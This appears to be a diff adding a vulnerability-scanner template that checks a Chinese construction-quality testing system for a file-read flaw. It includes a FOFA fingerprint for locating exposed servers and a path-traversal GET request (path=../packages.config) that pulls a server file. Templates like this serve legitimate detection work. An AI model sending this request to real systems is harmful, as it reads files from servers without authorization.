@@ -1,0 +1,33 @@
+id: poc-yaml-hunanjianyan-instrumentusagerecordexport-fileread
+info:
+  name: 湖南建研工程质量检测系统 InstrumentUsageRecordExport 文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  metadata:
+    finger: 湖南建研检测系统
+    fofa: body="/Content/Theme/Standard/"
+variables:
+  time: "{{date_time('2006-01-02')}}"
+http:
+  - method: GET
+    path:
+      - "/Applications/Forms/Custom/InstrumentUsageRecordExport.cshtml?act=down&path=../packages.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<html"
+        negative: true
+      - type: word
+        part: header
+        words:
+          - "application/pdf"
+      - type: word
+        part: header
+        words:
+          - "{{time}}.pdf"
